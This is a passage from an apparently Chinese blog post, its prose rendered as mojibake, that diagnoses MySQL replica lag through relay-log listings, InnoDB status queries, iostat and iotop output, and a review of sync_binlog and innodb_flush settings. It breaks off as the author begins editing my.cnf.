server-6-relay-bin.005015</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:35 server-6-relay-bin.005016</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757766 Aug 19 21:55 server-6-relay-bin.005017</span><br><span class="line">-rw-r----- 1 mysql mysql     484712 Aug 19 21:55 server-6-relay-bin.005018</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:55 server-6-relay-bin.005019</span><br><span class="line">-rw-r----- 1 mysql mysql 1074704096 Aug 19 22:14 server-6-relay-bin.005020</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 22:14 server-6-relay-bin.005021</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:14 server-6-relay-bin.005022</span><br><span class="line">-rw-r----- 1 mysql mysql 1074567071 Aug 19 22:25 server-6-relay-bin.005023</span><br><span class="line">-rw-r----- 1 mysql mysql       3299 Aug 19 22:25 server-6-relay-bin.005024</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:25 server-6-relay-bin.005025</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747930 Aug 19 22:35 server-6-relay-bin.005026</span><br><span class="line">-rw-r----- 1 mysql mysql     152479 Aug 19 22:35 server-6-relay-bin.005027</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:35 server-6-relay-bin.005028</span><br><span class="line">-rw-r----- 1 mysql mysql 1073749573 Aug 19 22:55 server-6-relay-bin.005029</span><br><span class="line">-rw-r----- 1 mysql mysql     206060 Aug 19 22:55 server-6-relay-bin.005030</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:55 server-6-relay-bin.005031</span><br><span class="line">-rw-r----- 1 mysql mysql 1073974611 Aug 19 23:14 server-6-relay-bin.005032</span><br><span class="line">-rw-r----- 1 mysql mysql      16223 Aug 19 23:14 server-6-relay-bin.005033</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:14 server-6-relay-bin.005034</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747289 Aug 19 23:30 server-6-relay-bin.005035</span><br><span class="line">-rw-r----- 1 mysql mysql     394623 Aug 19 23:30 server-6-relay-bin.005036</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:30 server-6-relay-bin.005037</span><br><span class="line">-rw-r----- 1 mysql mysql 1073964634 Aug 19 23:40 server-6-relay-bin.005038</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 23:40 server-6-relay-bin.005039</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:40 server-6-relay-bin.005040</span><br><span class="line">-rw-r----- 1 mysql mysql 1074362909 Aug 19 23:51 server-6-relay-bin.005041</span><br><span class="line">-rw-r----- 1 mysql mysql       3074 Aug 19 23:51 server-6-relay-bin.005042</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:51 server-6-relay-bin.005043</span><br><span class="line">-rw-r----- 1 mysql mysql 1073753748 Aug 20 00:06 server-6-relay-bin.005044</span><br><span class="line">-rw-r----- 1 mysql mysql     365716 Aug 20 00:06 server-6-relay-bin.005045</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:06 server-6-relay-bin.005046</span><br><span class="line">-rw-r----- 1 mysql mysql 1075420004 Aug 20 00:21 server-6-relay-bin.005047</span><br><span class="line">-rw-r----- 1 mysql mysql       4027 Aug 20 00:21 server-6-relay-bin.005048</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:21 server-6-relay-bin.005049</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757176 Aug 20 00:40 server-6-relay-bin.005050</span><br><span class="line">-rw-r----- 1 mysql mysql      17029 Aug 20 00:40 server-6-relay-bin.005051</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:40 server-6-relay-bin.005052</span><br><span class="line">-rw-r----- 1 mysql mysql 1074848048 Aug 20 00:56 server-6-relay-bin.005053</span><br><span class="line">-rw-r----- 1 mysql mysql       2106 Aug 20 00:56 server-6-relay-bin.005054</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:56 server-6-relay-bin.005055</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744109 Aug 20 01:15 server-6-relay-bin.005056</span><br><span class="line">-rw-r----- 1 mysql mysql     167283 Aug 20 01:15 server-6-relay-bin.005057</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:15 server-6-relay-bin.005058</span><br><span class="line">-rw-r----- 1 mysql mysql 1073863153 Aug 20 01:31 server-6-relay-bin.005059</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 01:31 server-6-relay-bin.005060</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:31 server-6-relay-bin.005061</span><br><span class="line">-rw-r----- 1 mysql mysql 1073755275 Aug 20 01:50 server-6-relay-bin.005062</span><br><span class="line">-rw-r----- 1 mysql mysql     351680 Aug 20 01:50 server-6-relay-bin.005063</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:50 server-6-relay-bin.005064</span><br><span class="line">-rw-r----- 1 mysql mysql 1073745924 Aug 20 02:00 server-6-relay-bin.005065</span><br><span class="line">-rw-r----- 1 mysql mysql     184126 Aug 20 02:00 server-6-relay-bin.005066</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:00 server-6-relay-bin.005067</span><br><span class="line">-rw-r----- 1 mysql mysql 1074559080 Aug 20 02:11 server-6-relay-bin.005068</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 02:11 server-6-relay-bin.005069</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:11 server-6-relay-bin.005070</span><br><span class="line">-rw-r----- 1 mysql mysql 1074703077 Aug 20 02:21 server-6-relay-bin.005071</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 02:21 server-6-relay-bin.005072</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:21 server-6-relay-bin.005073</span><br><span class="line">-rw-r----- 1 mysql mysql 1075168834 Aug 20 02:31 server-6-relay-bin.005074</span><br><span class="line">-rw-r----- 1 mysql mysql       3009 Aug 20 02:31 server-6-relay-bin.005075</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:31 server-6-relay-bin.005076</span><br><span class="line">-rw-r----- 1 mysql mysql 1073786213 Aug 20 02:41 server-6-relay-bin.005077</span><br><span class="line">-rw-r----- 1 mysql mysql       1969 Aug 20 02:41 server-6-relay-bin.005078</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:41 server-6-relay-bin.005079</span><br><span class="line">-rw-r----- 1 mysql mysql 1075261516 Aug 20 02:52 server-6-relay-bin.005080</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 02:52 server-6-relay-bin.005081</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:52 server-6-relay-bin.005082</span><br><span class="line">-rw-r----- 1 mysql mysql 1074090288 Aug 20 03:03 server-6-relay-bin.005083</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:03 server-6-relay-bin.005084</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:03 server-6-relay-bin.005085</span><br><span class="line">-rw-r----- 1 mysql mysql 1074140925 Aug 20 03:13 server-6-relay-bin.005086</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:13 server-6-relay-bin.005087</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:13 server-6-relay-bin.005088</span><br><span class="line">-rw-r----- 1 mysql mysql 1074942298 Aug 20 03:23 server-6-relay-bin.005089</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:23 server-6-relay-bin.005090</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:23 server-6-relay-bin.005091</span><br><span class="line">-rw-r----- 1 mysql mysql 1073946866 Aug 20 03:33 server-6-relay-bin.005092</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:33 server-6-relay-bin.005093</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:33 server-6-relay-bin.005094</span><br><span class="line">-rw-r----- 1 mysql mysql 1074995326 Aug 20 03:43 server-6-relay-bin.005095</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:43 server-6-relay-bin.005096</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:43 server-6-relay-bin.005097</span><br><span class="line">-rw-r----- 1 mysql mysql 1074411312 Aug 20 03:53 server-6-relay-bin.005098</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:53 server-6-relay-bin.005099</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:53 server-6-relay-bin.005100</span><br><span class="line">-rw-r----- 1 mysql mysql 1073961985 Aug 20 04:03 server-6-relay-bin.005101</span><br><span class="line">-rw-r----- 1 mysql mysql       1581 Aug 20 04:03 server-6-relay-bin.005102</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:03 server-6-relay-bin.005103</span><br><span class="line">-rw-r----- 1 mysql mysql 1073987949 Aug 20 04:14 server-6-relay-bin.005104</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:14 server-6-relay-bin.005105</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:14 server-6-relay-bin.005106</span><br><span class="line">-rw-r----- 1 mysql mysql 1074580980 Aug 20 04:23 server-6-relay-bin.005107</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:23 server-6-relay-bin.005108</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:23 server-6-relay-bin.005109</span><br><span class="line">-rw-r----- 1 mysql mysql 1074915235 Aug 20 04:32 server-6-relay-bin.005110</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:32 server-6-relay-bin.005111</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:32 server-6-relay-bin.005112</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750177 Aug 20 04:42 server-6-relay-bin.005113</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:42 server-6-relay-bin.005114</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:42 server-6-relay-bin.005115</span><br><span class="line">-rw-r----- 1 mysql mysql 1075582907 Aug 20 04:52 server-6-relay-bin.005116</span><br><span class="line">-rw-r----- 1 mysql mysql       1654 Aug 20 04:52 server-6-relay-bin.005117</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:52 server-6-relay-bin.005118</span><br><span class="line">-rw-r----- 1 mysql mysql 1073831777 Aug 20 05:02 server-6-relay-bin.005119</span><br><span class="line">-rw-r----- 1 mysql mysql        944 Aug 20 05:02 server-6-relay-bin.005120</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:02 server-6-relay-bin.005121</span><br><span class="line">-rw-r----- 1 mysql mysql 1073939965 Aug 20 05:12 server-6-relay-bin.005122</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:12 server-6-relay-bin.005123</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:12 server-6-relay-bin.005124</span><br><span class="line">-rw-r----- 1 mysql mysql 1074975635 Aug 20 05:23 server-6-relay-bin.005125</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:23 server-6-relay-bin.005126</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:23 server-6-relay-bin.005127</span><br><span class="line">-rw-r----- 1 mysql mysql 1073775752 Aug 20 05:34 server-6-relay-bin.005128</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:34 server-6-relay-bin.005129</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:34 server-6-relay-bin.005130</span><br><span class="line">-rw-r----- 1 mysql mysql 1073748439 Aug 20 05:45 server-6-relay-bin.005131</span><br><span class="line">-rw-r----- 1 mysql mysql      50123 Aug 20 05:45 server-6-relay-bin.005132</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:45 server-6-relay-bin.005133</span><br><span class="line">-rw-r----- 1 mysql mysql 1074232059 Aug 20 06:00 server-6-relay-bin.005134</span><br><span class="line">-rw-r----- 1 mysql mysql     218243 Aug 20 06:00 server-6-relay-bin.005135</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:00 server-6-relay-bin.005136</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742109 Aug 20 06:29 server-6-relay-bin.005137</span><br><span class="line">-rw-r----- 1 mysql mysql     566273 Aug 20 06:29 server-6-relay-bin.005138</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:29 server-6-relay-bin.005139</span><br><span class="line">-rw-r----- 1 mysql mysql 1073743811 Aug 20 06:50 server-6-relay-bin.005140</span><br><span class="line">-rw-r----- 1 mysql mysql     496397 Aug 20 06:50 server-6-relay-bin.005141</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:50 server-6-relay-bin.005142</span><br><span class="line">-rw-r----- 1 mysql mysql 1074448682 Aug 20 07:04 server-6-relay-bin.005143</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 07:04 server-6-relay-bin.005144</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:04 server-6-relay-bin.005145</span><br><span class="line">-rw-r----- 1 mysql mysql 1073933474 Aug 20 07:16 server-6-relay-bin.005146</span><br><span class="line">-rw-r----- 1 mysql mysql       5355 Aug 20 07:16 server-6-relay-bin.005147</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:16 server-6-relay-bin.005148</span><br><span class="line">-rw-r----- 1 mysql mysql 1074128415 Aug 20 07:29 server-6-relay-bin.005149</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 07:29 server-6-relay-bin.005150</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:29 server-6-relay-bin.005151</span><br><span class="line">-rw-r----- 1 mysql mysql 1074672741 Aug 20 07:40 server-6-relay-bin.005152</span><br><span class="line">-rw-r----- 1 mysql mysql       1335 Aug 20 07:40 server-6-relay-bin.005153</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:40 server-6-relay-bin.005154</span><br><span class="line">-rw-r----- 1 mysql mysql 1074458702 Aug 20 07:51 server-6-relay-bin.005155</span><br><span class="line">-rw-r----- 1 mysql mysql      10856 Aug 20 07:51 server-6-relay-bin.005156</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:51 server-6-relay-bin.005157</span><br><span class="line">-rw-r----- 1 mysql mysql 1073924438 Aug 20 08:01 server-6-relay-bin.005158</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 08:01 server-6-relay-bin.005159</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:01 server-6-relay-bin.005160</span><br><span class="line">-rw-r----- 1 mysql mysql 1075303853 Aug 20 08:13 server-6-relay-bin.005161</span><br><span class="line">-rw-r----- 1 mysql mysql       3783 Aug 20 08:13 server-6-relay-bin.005162</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:13 server-6-relay-bin.005163</span><br><span class="line">-rw-r----- 1 mysql mysql 1075011674 Aug 20 08:25 server-6-relay-bin.005164</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 08:25 server-6-relay-bin.005165</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:25 server-6-relay-bin.005166</span><br><span class="line">-rw-r----- 1 mysql mysql 1073759149 Aug 20 08:45 server-6-relay-bin.005167</span><br><span class="line">-rw-r----- 1 mysql mysql     595560 Aug 20 08:45 server-6-relay-bin.005168</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:45 server-6-relay-bin.005169</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744454 Aug 20 09:21 server-6-relay-bin.005170</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 09:21 server-6-relay-bin.005171</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 09:21 server-6-relay-bin.005172</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744721 Aug 20 09:59 server-6-relay-bin.005173</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 09:59 server-6-relay-bin.005174</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 09:59 server-6-relay-bin.005175</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744402 Aug 20 10:33 server-6-relay-bin.005176</span><br><span class="line">-rw-r----- 1 mysql mysql       1415 Aug 20 10:33 server-6-relay-bin.005177</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 10:33 server-6-relay-bin.005178</span><br><span class="line">-rw-r----- 1 mysql mysql  492892939 Aug 20 10:47 server-6-relay-bin.005179</span><br><span class="line">-rw-r----- 1 mysql mysql        210 Aug 20 10:47 server-6-relay-bin.005180</span><br><span class="line">-rw-r----- 1 mysql mysql  581257657 Aug 20 11:05 server-6-relay-bin.005181</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 11:05 server-6-relay-bin.005182</span><br><span class="line">-rw-r----- 1 mysql mysql   89230476 Aug 20 11:07 server-6-relay-bin.005183</span><br></pre></td></tr></table></figure><p>4.æŸ¥çœ‹innoDBçš„ç›¸å…³é…ç½®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global status like &apos;%innodb_log%&apos;;</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Variable_name             | Value      |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Innodb_log_waits          | 0          |</span><br><span class="line">| Innodb_log_write_requests | 1563734583 |</span><br><span class="line">| Innodb_log_writes         | 259641866  |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show global status like &apos;%innodb_buffer_pool_wait%&apos;;</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">| Variable_name                | Value    |</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">| Innodb_buffer_pool_wait_free | 13307693 |</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>å‘ç°ç¼“å†²æ± æœ‰å¤§é‡çš„ç©ºé—²é¡µç­‰å¾…è¢«æ‰§è¡Œ</p><p>5.åˆæ­¥æ€€ç–‘æ˜¯ä»åº“çš„sqlè¯­å¥è¯»å†™é€Ÿåº¦æ¯”è¾ƒæ…¢,æŸ¥çœ‹æœåŠ¡å™¨ç£ç›˜IOæƒ…å†µ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/20/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               1.06    14.14   80.26 1964.48  6209.75 19539.84    25.19     0.79    0.38   10.58    0.47   0.18  37.16</span><br><span class="line">dm-0              0.00     0.00   80.18 1977.08  6205.01 19533.60    25.02     0.07    0.04    0.45    0.02   0.18  37.17</span><br><span class="line">dm-1              0.00     0.00    1.18    1.56     4.74     6.23     8.00     0.03   11.99    4.65   17.57   0.12   0.03</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00    86.50  294.50 2278.00 22820.00 38805.75    47.91    19.72    7.54   58.32    0.98   0.39 100.00</span><br><span class="line">dm-0              0.00     0.00  296.50 2327.00 22852.00 38221.75    46.56    20.08    7.54   57.92    1.12   0.38  99.95</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00    31.50  497.00 2887.00 38196.00 42797.50    47.87    14.84    4.59   29.85    0.24   0.30 100.00</span><br><span class="line">dm-0              0.00     0.00  491.50 2918.50 37828.00 42797.50    47.29    14.88    4.56   30.19    0.25   0.29 100.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00  433.50 2135.00 34016.00 61046.25    74.02    11.60    3.98   17.68    1.20   0.39  99.85</span><br><span class="line">dm-0              0.00     0.00  439.50 2136.00 34680.00 61052.25    74.34    11.61    3.97   17.43    1.20   0.39  99.90</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00  828.00 1987.00 61214.00 21236.25    58.58    11.50    4.56   15.08    0.17   0.36  99.95</span><br><span class="line">dm-0              0.00     0.00  824.00 1986.00 60774.00 21230.25    58.37    11.52    4.57   15.15    0.18   0.36 100.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br></pre></td></tr></table></figure><p>ç£ç›˜IOè´Ÿè½½å·²ç»è¾¾åˆ°äº†100%.</p><p>6.æŸ¥çœ‹å ç”¨ç£ç›˜IOçš„ä¸»è¦è¿›ç¨‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Total DISK READ :      25.90 M/s | Total DISK WRITE :   64.71 M/s</span><br><span class="line">Actual DISK READ:      27.85 M/s | Actual DISK WRITE:   52.46 M/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line"> 93677 be/4 mysql    1280.78 K/s   54.50 K/s  0.00 % 89.19 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124925 be/4 mysql       5.30 M/s  735.77 K/s  0.00 % 86.79 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 86834 be/4 mysql    1853.04 K/s  711.92 K/s  0.00 % 85.62 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124935 be/4 mysql       2.83 M/s  817.52 K/s  0.00 % 77.32 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">127362 be/4 mysql    1825.79 K/s  545.01 K/s  0.00 % 74.37 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124928 be/4 mysql       3.94 M/s  517.76 K/s  0.00 % 74.02 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 31008 be/4 mysql       2.20 M/s  531.39 K/s  0.00 % 72.05 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30965 be/4 mysql     572.26 K/s  180.54 K/s  0.00 % 68.54 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 54715 be/4 mysql       3.67 M/s 1062.77 K/s  0.00 % 67.73 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30967 be/4 mysql     545.01 K/s  953.77 K/s  0.00 % 57.04 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30966 be/4 mysql    1021.90 K/s 1086.62 K/s  0.00 % 44.76 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30968 be/4 mysql     803.89 K/s  909.49 K/s  0.00 % 33.53 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 23438 be/4 mysql     136.25 K/s 1216.06 K/s  0.00 %  4.78 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30948 be/4 mysql       0.00 B/s    0.00 B/s  0.00 %  3.82 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30945 be/4 mysql       0.00 B/s    0.00 B/s  0.00 %  1.16 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30949 be/4 mysql       0.00 B/s   36.62 M/s  0.00 %  0.42 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br></pre></td></tr></table></figure><p>7.æŸ¥çœ‹mysqlæœ‰å…³ç£ç›˜IOçš„ä¸»è¦é…ç½®å‚æ•°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%sync_bin%&apos;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| sync_binlog   | 1     |</span><br><span class="line">+---------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%innodb_flush%&apos;;</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| Variable_name                  | Value |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| innodb_flush_log_at_timeout    | 1     |</span><br><span class="line">| innodb_flush_log_at_trx_commit | 1     |</span><br><span class="line">| innodb_flush_method            |       |</span><br><span class="line">| innodb_flush_neighbors         | 1     |</span><br><span class="line">| innodb_flush_sync              | ON    |</span><br><span class="line">| innodb_flushing_avg_loops      | 30    |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>sync_binlog=1è¡¨ç¤ºæ¯æ¬¡äº‹åŠ¡æäº¤åMySQLå°†è¿›è¡Œä¸€æ¬¡fsyncä¹‹ç±»çš„ç£ç›˜åŒæ­¥æŒ‡ä»¤æ¥å°†binlog_cacheä¸­çš„æ•°æ®å¼ºåˆ¶å†™å…¥ç£ç›˜ï¼Œé¢‘ç¹çš„å†™ç›˜å¯¼è‡´ç£ç›˜IOå±…é«˜ä¸ä¸‹ </p><p>innodb_flush_log_at_trx_commit=1æ—¶,log buffer ä¼šè¢«å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶å¹¶åˆ·å†™åˆ°ç£ç›˜ã€‚è¿™ä¹Ÿæ˜¯é»˜è®¤å€¼ã€‚è¿™æ˜¯æœ€å®‰å…¨çš„é…ç½®ï¼Œä½†ç”±äºæ¯æ¬¡äº‹åŠ¡éƒ½éœ€è¦è¿›è¡Œç£ç›˜I/Oï¼Œæ‰€ä»¥ä¹Ÿæœ€æ…¢ </p><p>æœ‰å…³è¿™ä¸¤ä¸ªå‚æ•°çš„æ›´å¤šè§£é‡Š,è¯·ç™¾åº¦</p><p>8.ä¿®æ”¹å‚æ•°é…ç½®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¼–è¾‘my.cnfé…ç½®æ–‡ä»¶:</span><br><span class="line">[root@server-6 ~]# vim /etc/my.cnf</span><br><span 